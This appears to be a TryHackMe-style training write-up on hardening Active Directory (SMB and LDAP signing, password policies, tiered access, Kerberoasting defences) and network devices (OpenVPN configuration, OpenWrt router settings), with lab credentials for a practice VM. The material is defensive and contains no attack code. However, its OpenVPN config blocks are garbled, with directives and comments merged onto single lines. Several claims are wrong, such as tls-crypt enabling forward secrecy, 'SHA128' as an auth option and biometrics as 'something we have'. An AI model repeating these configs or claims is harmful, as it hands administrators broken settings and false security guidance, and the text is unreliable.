![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/56a0dbd78d255d0ff7f75f225a82f9d4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/56a0dbd78d255d0ff7f75f225a82f9d4.png)

AD
 trusts categorised based on characteristics are known as Transitive and
 non-Transitive trusts. Transitive trust reflects a two-way relationship
 between domains. If there are three domains, domain A trusts domain B 
and domain B has a transitive trust with domain C. Consequently, domain A
 will automatically trust domain C for sharing resources.

Again, 
AD trusts are of two types when classified based on their direction: 
One-way and Two-way trusts. You can access the AD trust through the 
following:

`Server Manager > Tools > Active Directory Domains and Trust`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/c958af5bd65023280c6327222373d235.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/c958af5bd65023280c6327222373d235.png)

# Container and Leaves

For those familiar, each network part is treated as an object in AD. Anything from resources, users, services, or part of the network can be an object. The
 hierarchical structure of AD defines that an object may or may not 
contain other objects based on the scenario. When an object holds 
another object, it is termed a container; otherwise, it is called the 
leaf object.

**Securing Authentication Methods**

In this task, we will 
briefly learn various security authentication methods that can be used 
for secure communication and ensuring data integrity from one machine to
 another in an AD environment. We will use the built-in Microsoft tool **Group Policy Management Editor**
 available in the attached AD machine for configuring various security 
policies. The instructions to access the tool are as below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3fcb2f6dc2907f3ccaa05dd73d703dac.gif](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3fcb2f6dc2907f3ccaa05dd73d703dac.gif)

**LAN Manager Hash**

The
 user account password for Windows isn't stored in clear text; instead, 
it stores passwords with two types of hash representation. When the 
password for any user account is changed or set with fewer than 15 
characters, both LM hash (LAN Manager hash) and NT hash (Windows NT 
hash) are generated by Windows and can be stored in AD. The LM hash is 
relatively weaker than the NT and is prone to a fast brute-force 
attack. The best recommendation is to prevent Windows from storing the password's LM hash. You can access it through the following:

`Group
 Policy Management Editor > Computer Configuration > Policies >
 Windows Settings > Security Settings > Local Policies > 
Security Options > double click Network security - Do not store LM 
hash value on next password change policy > select "Define policy 
setting"`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3a33943590f2d9431e975a762900a32b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3a33943590f2d9431e975a762900a32b.png)

**SMB Signing**

SMB
 stands for Server Message Block. Generally, Microsoft-based networks 
utilise this protocol for file and print communication. Moreover, it 
allows secure transmission over the network. Configuring SMB signing through group policy is crucial to detect
 Man in the Middle (MiTM) attacks that may result in modification of SMB
 traffic in transit. SMB signing ensures the integrity of data for both 
client and server. All supported Windows versions have an SMB packet signing option.

`Group
 Policy Management Editor > Computer Configuration > Policies >
 Windows Settings > Security Settings > Local Policies > 
Security Options > double click Microsoft network server: Digitally 
sign communication (always) > select Enable Digitally Sign 
Communications`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/46f40389033a68174450f9f97bf3a624.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/46f40389033a68174450f9f97bf3a624.png)

**LDAP Signing**

Light
 Weight Directory Access Protocol (LDAP) enables locating and 
authenticating resources on the network. Hackers may introduce replay or
 MiTM attacks to launch custom LDAP requests. Therefore, LDAP signing is
 a Simple Authentication and Security Layer (SASL) property that only 
accepts signed LDAP requests and ignores other requests (plain-text or 
non-SSL). We can enable LDAP signing through the following:

`Group
 Policy Management Editor > Computer Configuration > Policies >
 Windows Settings > Security Settings > Local Policies > 
Security Options > Domain controller: LDAP server signing 
requirements > select Require signing from the dropdown`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/465b558bb5818a308de03a599ff7f14f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/465b558bb5818a308de03a599ff7f14f.png)

# Password Rotation

Active
 Directory password security is critical to address because of security 
breaches and password reuse. It becomes challenging for any organisation
 to reset account passwords or update them everywhere, so they prefer 
not to do it. This scenario could have a few alternate approaches, and each method has pros and cons.

- **First Technique:** Creating a script to update passwords automatically in the Scheduled Task with
the help of PowerShell. This method does not require any additional
overhead and removes all the manual efforts for password rotation, but
it requires you to write and maintain your script – which could be
challenging.
- **Second Technique:** Add a Multi-Factor
Authentication (MFA) solution to AD and choose not to change the
password often. It adds a security layer, and you will not need to
change your password often. You can read more about implementing MFA [here](https://docs.microsoft.com/en-us/azure/active-directory/authentication/howto-mfa-getstarted).
- **Third Technique:** Microsoft provides a solution for services account password rotation
through Group Managed Services Accounts (gMSAs), which changes passwords after every 30 days. You can learn more about it [here](https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-group-managed).

# Password Policies

Attackers
 use various corporate password-compromise techniques, including brute 
force, dictionary, password spraying, credential attacks etc. All 
organisations must have a strict password policy to defend against all 
such attacks. Password policies mean different rules for creating 
passwords, including length, complexity, and changing frequency. For viewing and configuring the password policy, you can use the following:

`Group
 Policy Management Editor > Computer Configuration > Policies >
 Windows Settings > Security Settings > Account Policies > 
Password Policy`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/b7eb4e5bfb78c6744d05898ff3da8f83.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/b7eb4e5bfb78c6744d05898ff3da8f83.png)

# Understanding Password Policy Settings

- **Enforce password history:** Prevent at least 10 to 15 old passwords from being set as new ones.
- **Minimum password length:** The minimum password length should be set between 10 to 14.
- **Complexity requirements:** Must not contain the name of the user account and ensure the password has
uppercase letters, lowercase letters, digits, or special characters.

**Implementing Least Privilege Model**

Implementing the least 
privilege model requires limiting the user or application access to 
minimise security risks and attack surfaces. When the application or the
 users are allowed to operate with administrative privileges, they are 
granted complete access to modify, alter, create other resources on the 
system and perform any action with administrative rights. Contrary to 
this, the least privilege model grants limited and authorised access per
 current conditions.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8d0b5ea956fac0ba9d990fe7f4817837.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8d0b5ea956fac0ba9d990fe7f4817837.png)

**Creating the Right Type of Accounts**

Implementing
 the least privilege model requires setting up the different account 
types for diverse purposes. It includes the following account types:

- **User accounts**: You must promote using regular user accounts for most people in the
network, who are necessary to perform their regular duties.
- **Privilege account**s: These are the accounts with elevated privileges and are further classified as first and second privilege accounts.
- **Shared accounts**: These accounts are shared amongst a group of people, as the visitors with
bare minimum privileges, to give limited access for a specific time.
These accounts are not recommended and must be utilised in limited
scenarios.

# Role-Based Access Control

As
 a System Administrator, it is of utmost importance to grant rights to 
resources while keeping the principle of Least privilege in mind, which [states](https://en.wikipedia.org/wiki/Principle_of_least_privilege) that:

Per Wikipedia, "*The
 principle of minimal privilege or the principle of least authority, 
requires that in a particular abstraction layer of a computing 
environment, every module (such as a process, a user, or a program, 
depending on the subject) must be able to access only the information 
and resources that are necessary for its legitimate purpose*".

Role-based access control allows you to indicate access privileges at 
different levels. It includes DNS zone, server, or resource record 
levels and specifies who has access control over creating, editing, and 
deleting operations of various resources of Active Directory.

**Tiered Access Model**

The
 Active Directory Tiered Access Model (TAM) comprises plenty of 
technical controls that reduce the privilege escalation risks. It
 consists of a logical structure that separates Active Directory's 
assets by creating boundaries for security purposes. The primary goal is
 the protection of Active Directory's top-valued identities (Tier 0). At
 the same time, domain members and other users can perform routine 
tasks, such as email checking, surfing the internet, and using apps and 
other services (Tier 1, 2). It comprises three tiers, Tier 0, 1, and 2, which are as follows:

- **Tier 0**: Top level and includes all the admin accounts, Domain Controller, and groups.
- **Tier 1**: Domain member applications and servers.
- **Tier 2**: End-user devices like HR and sales staff (non-IT personnel).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/913171d76044f97b5a65521e576a675a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/913171d76044f97b5a65521e576a675a.png)

# Implementation of Tiered Access Model

The critical implementation of this model is based on the principle of *"Prevention of privileged credentials from crossing boundaries, either accidentally or intentionally"*.
 Implementing technical controls via Group Policy Objects is crucial to 
avoid such scenarios. These Group Policy Objects put together the 
security rights that can deny access or grant permission. You can read 
more about the Tiered and Enterprise Access Model (EAM) [here](https://docs.microsoft.com/en-us/security/compass/privileged-access-access-model).

**Auditing Accounts**

Accounts
 audit is a crucial task mainly carried out by setting up the correct 
account, assigning privileges, and applying restrictions. Three audit 
types related to accounts must be done periodically: usage, privilege, 
and change audits.

- Usage audits allow monitoring each account's specific tasks and validating their access rights.
- A privilege audit allows you to check if every account in the system has the least privilege.
- Change audits allow you to look for any improper changes to account
permissions, passwords, or settings. Any unacceptable change to these
may lead to a data breach.

**Microsoft Security Compliance Toolkit**

Microsoft Security 
Compliance Toolkit (MSCT) is an official toolkit provided by Microsoft 
to implement and manage local and domain-level policies. You don't have 
to worry about complex policy syntaxes and scripts, as Microsoft will 
provide pre-developed security baselines per the end user environment. You can download MSCT from the official Microsoft website [link.](https://www.microsoft.com/en-us/download/details.aspx?id=55319) You can find all the baselines and policy analyser software on `Desktop > Scripts` of the attached VM.

# Installing Security Baselines

Microsoft
 offers its customers security baselines readily available in consumable
 formats, like, Group Policy Objects Backups. You can easily download it
 as zip files and extract the content. Here is how you can download and install the security baselines for Windows Server in a simple way:

`Open Microsoft Security Compliance Website > click Download > click Windows Servers Security Baseline.zip > Download`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ad2a73b2287a9bf29b0f07a4762480e5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ad2a73b2287a9bf29b0f07a4762480e5.png)

`Open extracted folder > Scripts > & select desired baseline & execute with PowerShell`

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f19023b4d1b5df9f2a6f371811a8bca3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f19023b4d1b5df9f2a6f371811a8bca3.png)

**Policy Analyser**

One
 of the Security Compliance ToolKit's features is a policy analyser 
which allows comparison of group policies to quickly check 
inconsistencies, redundant settings, and the alterations that need to be
 made between them. Consider a scenario where plenty of GPOs are applied
 at diverse levels. There will be conflicting, redundant settings and 
many more avenues that can be quickly resolved with a policy analyser. Same as security baselines, it is downloaded as a zip file from the [same link](https://www.microsoft.com/en-us/download/details.aspx?id=55319), and one can easily extract the content and then follow the procedure, as shown in the following steps:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/1b2e80e317439e72d5397f840177ebc8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/1b2e80e317439e72d5397f840177ebc8.png)

Once downloaded, you can run the `PolicyAnalyzer.exe` to add and manage local or domain-level policies.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5a7f7844170f99d5085543d765cf5c5c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/5a7f7844170f99d5085543d765cf5c5c.png)

Be careful while downloading security baselines, as they should only be downloaded from the official Microsoft website.

**Protecting Against Known Attacks**

If an intruder 
successfully gains domain admin account access, you may consider that 
the game is over. No one is ever ready to disclose the company's 
confidential data or for financial loss. Before we discuss some known 
attacks, it is crucial to think like an attacker and develop a mindset 
wearing their shoes. Here are some already developed interesting rooms 
on THM to get you going through the possibilities and swathe of attack 
vectors for an adversary.

- [Zero Logon](https://tryhackme.com/room/zer0logon) (Get admin access to an AD without credentials).
- [Breaching AD](https://tryhackme.com/room/breachingad) (Getting the first set of credentials in an AD environment).
- [Exploiting AD](https://tryhackme.com/room/exploitingad) (Learn common AD exploitation techniques).
- [Post-Exploitation](https://tryhackme.com/room/postexploit) basics (What an attacker does after gaining an initial foothold of AD).

Let's review a few methods for Active Directory protection against known attacks.

**Kerberoasting**

[Kerberoasting](https://tryhackme.com/room/attackingkerberos) is
 a common and successful post-exploitation technique for attackers 
to get privileged access to AD. The attacker exploits Kerberos Ticket 
Granting Service (TGS) to request an encrypted password, and then the 
attacker cracks it offline through various brute force techniques. These
 attacks are difficult to detect as the request is made through an 
approved user, and no unusual traffic pattern is generated during this 
process. You can prevent the attack by ensuring an additional layer of 
authentication through MFA or by frequent and periodic Kerberos Key 
Distribution Centre (KDC) service account password reset. You can learn 
more about the attack [here](https://microsoft.com/security/blog/2020/08/27/stopping-active-directory-attacks-and-other-post-exploitation-behavior-with-amsi-and-machine-learning/).

# Weak and Easy-to-Guess Passwords

The
 easiest target for intruders to breach security is the weak and 
easy-to-guess old passwords. The best recommendation is to use strong 
passwords and avoid already known ones. A strong password consists of a 
combination of uppercase and lowercase letters, numbers, and special 
characters. You can learn more about password strength [here](https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-password-ban-bad-combined-policy).
 There are many tools available that can help you perform Password 
Auditing in AD. You can see a report generated through a free tool on `Desktop > Password-Report.png.`

# Brute Forcing Remote Desktop Protocol

The
 intruders or attackers use scanning tools to brute force the weak 
credentials. Once the brute force is successful, they quickly access the
 compromised systems and try to do privilege escalation along with a 
persistent foothold﻿ in the target's computer. The best recommendation 
is to never expose RDP without additional security controls to the 
public internet. Continuous audits for scanning attacks or brute-force 
attempts are also an important step.

# Publically Accessible Share

During
 AD configuration, some share folders are publicly accessible or left 
unauthenticated, providing an initial foothold for attackers for lateral
 movement. You can use the `Get-SmbOpenFile` cmdlet in PowerShell to look for any undesired share on the network and configure access accordingly.

## **NETWORK DEVICE HARDENING**

**Introduction**

Network devices are the
 building blocks and backbone of today's contemporary and large-scale 
networks and systems. The role of network devices is to ensure reliable 
and efficient transfer, filtering, and management of data across or 
within networks. Many network devices range from basic layer one hubs or
 repeaters to layer two switches, layer three routers, load balancers, 
virtual private networks, and intrusion prevention systems.

**Common Threat and Attack Vectors**

# Difference between Network Devices and Endpoint Devices

Before
 proceeding with our actual topic, it is imperative to understand the 
difference between network devices and endpoint devices. Endpoint 
devices refer to any device that can generate or consume data on a 
network, such as Laptops, Desktops, Smartphones, Tablets, Printers, 
Servers, and IoT
 Devices. They are typically located at the edge of a network and 
interact directly with users. The figure below shows the difference 
between endpoint and network devices based on their functionality, 
traffic, and configuration.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/442f322a1e8013f07092337940676a94.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/442f322a1e8013f07092337940676a94.png)

**Common Threats and Attack Vectors of Network Devices**

The unprecedented growth in today's Information and Communication Technology (ICT)
 networks has transformed the world into a global village. On the other 
hand, it has also given rise to multifarious malicious activities by 
cyber attackers. As we have already studied, the various network devices
 are the backbone of modern ICT networks. To ensure confidentiality, 
integrity, and availability (CIA) in our networks and systems, it is 
imperative that we implement security hardening measures to these 
devices. Some common goals of hardening include protection from 
unauthorised access & attacks/exploits, enforcement of access 
policies, prevention of data theft, and continuous availability of 
critical systems.

| **Threat** | **Description** | **Attack Vector** |
| --- | --- | --- |
| **Unauthorised access** | Gain unauthorised control of a network device, and then the complete network. | • Password attacks (brute force, dictionary & hybrid)
• Exploit known vulnerabilities, e.g. RCE
• Social
 Engineering/Phishing attack to trick network administrators into 
disclosing sensitive information such as usernames and passwords of 
devices |
| **Denial of Service (DoS)** | Disruption of critical devices and services to make them unavailable to genuine users. | • Flooding devices with fake requests
• Exploiting vulnerabilities in logical or resource handling
• Manipulating network packets |
| **Man-in-the-Middle Attacks** | Intercept
 the network requests between two parties by masquerading as each other 
to steal sensitive information or alter/manipulate the requests. | • ARP spoofing
• DNS spoofing
• Rogue access points |
| **Privilege escalation** | Gaining
 higher-level privileges or rights to perform restricted actions, e.g. 
accessing sensitive information or executing malicious code. | • Weak passwords or use of the same passwords for user and admin accounts
• Exploiting vulnerabilities
• Misconfigurations |
| **Bandwidth theft/ hotlinking** | Linking
 a bandwidth-intensive resource (image or video) from an external 
website to its original website, without permission. This can cause 
increased traffic to the original website. | • Scraping large volumes of data
• DoS attacks
• Malware attacks |

**Common Hardening Techniques**

# General Techniques

Hardening
 techniques are meant to reduce the attack surface of a system or 
network by removing unnecessary functionality, limiting access, and 
implementing various security controls. Some standard methods are 
mentioned below:

- **Updating & Patching**:
Ensuring the latest version of the Operating System and underlying
applications of all devices and systems and installing regular security
patches is the core hardening measure. Outdated OS and applications contain vulnerabilities that attackers can exploit.
- **Disabling unnecessary services & ports**: Turn off all unnecessary services and block all ports (physical and
virtual) that are not needed for system functionality. This will reduce
the attack surface by minimising the number of entry points an attacker
can exploit.
- **Principle of Least Privilege (POLP)**: Restrict users and processes to only the minimum necessary permissions required to perform their functions.
- **Logs Monitoring**: Implement a log monitoring system to monitor for unusual activity or security events.
- **Backup regularly**: Take routine backups of systems and configurations as they can help recover from a security incident or system failure.
- **Enforcing Strong Passwords**: Change default login passwords and use strong passwords that are at
least ten characters long with a combination of small letters, capital
letters, special characters, and numbers. These types of passwords
protect against dictionary and brute-force attacks.
- **Multi-Factor Authentication (MFA)**: MFA is an additional security layer requiring two or more types of
identification before accessing the account or system. The two factors
are generally something we know (like passwords) and something we have
(like biometrics).

# Importance of Secure Protocols

Secure protocols play a critical role in network device hardening by protecting against unauthorised access and data breaches. They ensure that sensitive data transmitted between devices is encrypted and cannot be intercepted by malicious actors. Moreover,
 secure protocols also help prevent man-in-the-middle attacks and other 
network-based exploits. Using secure protocols, network administrators 
can ensure that only authorised personnel can access sensitive 
information and perform system administration tasks. Necessary security 
protocols include HTTPS, SSH, SSL/TLS, and IPsec. You can learn more about secure network protocols in [this](http://tryhackme.com/jr/networksecurityprotocols) room.

# Removal/Blocking of Insecure Protocols

In
 addition to using secure protocols, removing and blocking access to 
those insecure protocols is equally essential, which will decrease an 
attacker's attack surface. Most important are the protocols that 
transmit data in clear text without encrypting them, like FTP,
 HTTP, Telnet, SMTP, and more. Moreover, there are inherently secure 
protocols (e.g. LDAP, RDP, SIPS); however, they can allow attackers to 
exploit the network if configured incorrectly.

# Implementation of Monitoring and Logging Controls

Logging
 in network devices is essential for detecting and investigating 
security incidents, identifying performance issues, and complying with 
regulatory requirements. It provides a record of events and activities 
on the device, which can be used for troubleshooting, forensic analysis,
 and auditing purposes. The following techniques are generally used for 
logging:

- **Syslog**: A protocol to standardise the
transfer of log messages, with the purpose of storing and analysing log
messages to a central server.
- **SNMP**: Traps a notification sent by a network device to a management system when a predefined event occurs.
- **NetFlow**: A protocol used to collect and analyse network traffic data for monitoring and security analysis.
- **Packet Captures**: Capturing network traffic and storing it for analysis using a tool like Wireshark.

**Hardening Virtual Private Networks**

Virtual private networks (VPNs) are now 
needed in the age of remote work and online communication to protect 
sensitive data and preserve privacy. Yet, hardening VPNs is crucial to 
ensure their efficiency as cyberattacks continue to develop. Hardening 
VPNs entails adopting additional security measures, such as multi-factor
 authentication and encryption techniques, to make it more challenging 
for hackers to access the network. By taking these extra precautions, 
businesses can better safeguard their data and defend against 
cyberattacks, raising their security level and bringing them more peace 
of mind.

**Standard Hardening Practices**Usually, all the VPN
 servers consist of server-side and client-side configurations through a
 standard config file. System administrators must understand the file's 
content and edit it as per best security practices. You will be using 
the following commands in the upcoming exercises:

- The OpenVPN server config file is located at `/etc/openvpn/server/server.conf`. Once the machine is loaded, open the terminal and load the file by issuing the command `sudo nano /etc/openvpn/server/server.conf`.
- Once you made the desired changes in the file, press `Ctrl+O` and hit `Enter`, then press `Ctrl+X` to exit.
- The command `sudo systemctl restart openvpn-server@server.service` can restart the OpenVPN service.

Moving forward, the following are some of the significant hardening practices for a VPN server:

- Use strong encryption algorithm: Configure the VPN gateway to use strong encryption to protect data in transit. The **cipher** directive in the config file can be used to select the encryption scheme. The possible options for [cipher](https://community.openvpn.net/openvpn/wiki/CipherNegotiation) include AES, Blowfish, Camellia, and more. For example, **AES-128-CBC** mode means to use the AES encryption algorithm with a key size of 128-bit in Cipher Block Chaining (CBC) mode, as seen below. **AES-256-CBC** is typically considered one of the strongest cipher encryption nowadays.

OpenVPN Configuration

```
thm@machine$ sudo nano /etc/openvpn/server/server.conflocal 10.10.79.136
port 1194
proto udp
dev tun
ca ca.crt
cert server.crt
key server.key
cipher AES-128-CBC #cipher options can be modifieddh dh.pem
auth SHA256 tls-crypt tc.key
topology subnet

```

- **Keep VPN gateway software up-to-date**: Ensure that the VPN gateway software is always updated with the latest security patches and updates. Every VPN software has a different method for it. You can use `sudo apt upgrade openvpn` to update OpenVPN (please note that the attached VM does not have an internet connection).
- Implement strong authentication: Use strong authentication mechanisms such as a combination of Transport Layer Security (TLS) and a secure hashing algorithm. We can use the `auth` directive to specify the exact algorithm in the OpenVPN configuration
file to ensure that a secure hashing algorithm will be used for packet
authentication. Some of the [options](https://community.openvpn.net/openvpn/wiki/Openvpn24ManPage#--auth%20alg) for auth directive are **SHA1, SHA128, SHA256, SHA512 and MD5**. You can set the auth directive through the following command:

OpenVPN Configuration

```
thm@machine$ sudo nano /etc/openvpn/server/server.conflocal 10.10.79.136
port 1194
proto udp
dev tun
ca ca.crt
cert server.crt
auth SHA256 #use this to change the auth parametertls-crypt tc.key
topology subnet

```

- **Change default settings**: Change the default usernames and passwords to something unique to reduce the risk of unauthorised access to the VPN gateway.
- **Enable Perfect Forward Secrecy (PFS)**: Perfect Forward Secrecy (PFS) in OpenVPN generates unique session keys for each session to strengthen the
security of the VPN connection. Because of this, even if a hacker
successfully obtained a session key, they could not use it to decode
more sessions. For each session, PFS generates a new set of encryption
keys, preventing the possibility of remotely decrypting previously
acquired material. As a result, it is far more challenging for an
attacker to spoof the VPN connection and steal sensitive data. We can
use the `tls-crypt` directive in the OpenVPN configuration file to enable PFS. The `tls-crypt` directive requires a key that can be generated using the command `sudo openvpn --genkey --secret my.key` and should be placed in the same directory on the server. Choosing the appropriate cipher and auth, like **cipher AES-256-CBC** and **auth SHA 256**, supports PFS if combined with tls-crypt. The exact configuration is mentioned below:

OpenVPN Configuration

```
thm@machine$ sudo nano /etc/openvpn/server/server.conflocal 10.10.79.136
port 1194
proto udp
dev tun
ca ca.crt
cert server.crt
cipher AES-256-CBC
auth SHA256
tls-crypt my.key #use this to change the tls-crypt parametertls-version-min 1.2  #use this to change the TLS versiontopology subnet

```

- **Dedicated Users for VPN Server:** Limit user access by creating a dedicated user account and group with
restricted permissions specifically for running the OpenVPN server.

Plenty of other options can help you secure and harden an OpenVPN 
server; it all depends on the organisation's requirements. However, by 
default providing restricted access to the users enables a limited 
attack surface for the attacker.

**Hardening Routers, Switches & Firewalls**

Routers
 and switches must be hardened for the network infrastructure to be 
secure and reliable. Every network needs routers and switches, often the
 first line of defence against potential security risks and attacks. By 
hardening these devices, we can lower the possibility of unauthorised 
access, avoid data breaches, and ensure network service availability. Improved
 network performance, increased resilience against cyberattacks, and 
regulatory compliance are a few of the main advantages of hardening 
routers and switches. Routers and switches without enough hardening are 
susceptible to various attacks, including denial of service and network 
profiling.

In the previous task, we studied how to harden a network device using a configuration file on a Command Line Interface (CLI). In this task,
 we will use the web interface to learn different methods for hardening a
 router. We will be using a router that has OpenWrt installed, which is a free and open-source Linux-based operating system for embedded devices. We know that a router
 configuration varies from product to product; however, a few standard 
techniques can be applied to protect from potential attacks. You can access the OpenWrt web interface at `10.10.79.136:8080` with the following credentials:

- Username: `root`
- Password: `TryHackMe`

# Recommended Hardening Techniques

- **Setting up the device**: While setting up any network device, it is necessary to fill in all
relevant details like hostname, timezone, logging, and more. These
features assist in conducting incident handling in case of a compromise. For example, logging must be enabled to log all the events with the
default alert level `Debug`. Similarly, timezone and time
synchronisation must be set accurately to properly correlate events with their occurrence time. You can enable and modify these settings through `System > System` and select the desired option.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/27acc27c490c8b94858ef7ad2bad42ac.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/27acc27c490c8b94858ef7ad2bad42ac.png)

- **Change default credentials**: Usually, the admin web interface is protected through a username and
password, and people tend to ignore changing the default. A threat actor can access the router's admin interface and compromise the whole
network using default credentials. We can change the default password in OpenWrt through `System > Administration`, enter a new password, and click the `Save` button.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/c2372f525095a6bcc018a53add0dc280.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/c2372f525095a6bcc018a53add0dc280.png)

- **Enable secure network protocols**: For a network device to maintain the confidentiality, integrity, and
availability of network traffic, secure protocols must be enabled.
Secure protocols like HTTPS, SSH, and SSL/TLS offer encrypted authentication mechanisms and
communications to stop unauthorised access and eavesdropping. By
enabling secure protocols on a router, you can reduce the risk of data
breaches, man-in-the-middle attacks, and other security threats. You can enable SSH in OpenWrt through `System > Administration > SSH Access`, then select the interface and port number and click `Save & Apply`. Moreover, you can also add specific public SSH-Keys for passwordless login.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/34a736adbec438bd5318fb92cdfeddd5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/34a736adbec438bd5318fb92cdfeddd5.png)

- **Disabling unnecessary scripts**: Almost every network device executes some startup scripts to provide a
better user experience to a user. For example, crontab is executed on
startup to verify and execute any cron job. Threat actors try to gain
persistent access on a network device by adding their malicious scripts
on the startup. We can add/remove startup scripts and set the priority
through `System > Startup`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/96abbe862786f4312a0b56578ded64da.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/96abbe862786f4312a0b56578ded64da.png)

- **Securing Wi-Fi**: If the router has Wi-Fi capabilities, securing the Wi-Fi by enabling
strong encryption like WPA2/WPA3, disabling SSID broadcast, changing
default passwords, and more.

**Hardening Routers, Switches & Firewalls - More Techniques**

# Recommended Hardening Techniques

- **Manage traffic rules**: Network devices allow you to create and implement traffic rules that
accept/deny network traffic. For example, we notice that the data of
users connected with our network device is being exfiltrated to a
command and control server IP address. We can create a rule to block all traffic where the destination IP matches the attacker's command and
control server. We can add/edit traffic rules through `Network > Firewall > Traffic Rules`, and click `Add` to create a new rule.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/49be5859e279b734eb63be67a45f7f7e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/49be5859e279b734eb63be67a45f7f7e.png)

- **Monitor traffic**: As a network administrator, keeping track of network traffic, like
uploads and downloads of data at different intervals, is essential. For
example, you have excessive data uploaded from one of the email servers
to an unknown IP address. Such alerts enable you to take remedial
measures and stop data pilferage timely. Usually, network devices
provide real-time graphs to monitor the traffic. We can view real-time
traffic statistics through `Status > Realtime Graph > Traffic`.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ba97ccd65f50e4a40033204ae8e81e4f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/ba97ccd65f50e4a40033204ae8e81e4f.png)

**Note**:
 Since no client is connected with the network device, you won't see any
 traffic in the real-time traffic statistics on the target machine.

- **Configuring port forwarding**: A firewall's port forwarding capability enables inbound traffic from the
internet or other sources to be routed to a particular device or service on the internal network. The firewall can send incoming traffic to the
appropriate device or service on the internal network by establishing
port forwarding rules while blocking any other incoming traffic that
does not comply with the rules. This feature helps host applications
that need outside access, granting remote control of internal devices.
Port forwarding should be used carefully because it can expose internal
devices and services to potential security issues if improperly secured
and configured. Threat actors could add new rules here for creating
connections to external command and control servers. We can configure
port forwarding through `Network > Firewall > Port Forwards`, and click the `Add` button.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d9f216eb279699879693674eaf1e195d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d9f216eb279699879693674eaf1e195d.png)

- **Monitoring scheduled tasks**: It is important to monitor scheduled tasks to confirm that the original scheduled tasks lists are not modified by a threat actor. To add or
remove scheduled tasks, which in our case are handled by cron, navigate
to `System > Scheduled Tasks`, add the new cron job, and click `Save`. You can learn how to create cron jobs [here](https://phoenixnap.com/kb/set-up-cron-job-linux).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0a9310b6c761997c1e1a2191b8f486b1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/0a9310b6c761997c1e1a2191b8f486b1.png)

- **Update firmware**: It is essential to update the firmware and installed packages on a
regular basis to avoid any know/unknown attacks. We can update the
firmware through `System > Software`.

